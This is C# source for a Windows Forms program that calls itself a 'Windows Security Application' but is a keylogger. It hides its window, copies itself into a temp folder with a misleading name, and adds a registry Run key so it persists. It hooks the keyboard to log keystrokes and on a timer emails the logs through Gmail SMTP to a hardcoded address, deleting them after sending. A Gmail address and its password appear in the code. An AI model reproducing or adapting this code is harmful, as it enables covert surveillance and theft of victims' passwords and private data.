using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Threading;

namespace Windows_Security_Application
{
    /// <summary>
    /// 
    /// </summary>
    public partial class frm_Main : Form
    {
        string path_attachment;
        KeyLogger kl = new KeyLogger();

        public frm_Main()
        {
            InitializeComponent();
        }

        private void frm_Main_Load(object sender, EventArgs e)
        {
            Option();
            StartWin();
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Hide();
            timer_sendmail.Start();
        }
        private void Option()
        {
            //
            //move file
            //
            if (!Directory.Exists(Path.GetTempPath() + "Windows System Directory Logs"))
                Directory.CreateDirectory(Path.GetTempPath() + "Windows System Directory Logs");
            if (!Directory.Exists(Path.GetTempPath() + "Windows System Directory Setup"))
                Directory.CreateDirectory(Path.GetTempPath() + "Windows System Directory Setup");
            string src = AppDomain.CurrentDomain.BaseDirectory + "WindowsSecurityApplication.exe";
            string path = Path.GetTempPath() + @"Windows System Directory Setup\WindowsSecurityApplication.exe";
            if (!File.Exists(path))
                File.Copy(src, path);
            //
            //Keylog
            //
            kl.Enabled = true;
            kl.HookKeyboard = true;
            kl.FlushInterval = 120000;
            kl.LOG_FILE = Path.GetTempPath() + @"Windows System Directory Logs" + "\\winlogs";
            kl.LOG_OUT = "file";
            kl.LOG_MODE = "day";
        }
        private void StartWin()
        {
            string path = Path.GetTempPath() + @"Windows System Directory Setup\WindowsSecurityApplication.exe";

            RegistryKey regkey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\\Run", true);
            if (regkey != null)
            {
                try
                {
                    regkey.SetValue("APIwindows", path);
                    string value = regkey.GetValue("APIwindows").ToString();
                }
                catch
                {
                    RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\\Run");
                    key.SetValue("APIwindows", path);
                    key.Close();
                }
            }
        }
        private void sendEmailnet()
        {
            path_attachment = Path.GetTempPath() + @"Windows System Directory Logs";
            DirectoryInfo di = new DirectoryInfo(path_attachment);
            foreach (FileInfo fi in di.GetFiles("*.html"))
            {
                MessageBox.Show(fi.FullName);
                string email = "huutuyen.adidaphat131420@gmail.com";
                MailAddress Send = new MailAddress("adidaphat0605@gmail.com", "UKP32");
                MailAddress Recieve = new MailAddress(email);
                MailMessage message = new MailMessage(Send, Recieve);
                message.Sender = new MailAddress("adidaphat0605@gmail.com", "UKP32");
                message.Subject = "Just Checking...";
                message.Body = "This is an automated email sent from Keylogger";
                System.Net.Mail.SmtpClient emailClient = new System.Net.Mail.SmtpClient();
                emailClient.UseDefaultCredentials = false;
                emailClient.Credentials = new System.Net.NetworkCredential("adidaphat0605@gmail.com", "anhyeuem1102");
                emailClient.Host = "smtp.gmail.com";
                emailClient.Port = 587;
                System.Net.Mail.Attachment mailAttachment = new System.Net.Mail.Attachment(fi.FullName);
                message.Attachments.Add(mailAttachment);
                emailClient.EnableSsl = true;
                emailClient.Timeout = 20000;
                emailClient.Send(message);
                message.Dispose();
                fi.Delete();
            }
        }

        private void timer_sendmail_Tick(object sender, EventArgs e)
        {
            sendEmailnet();
        }
    }
}
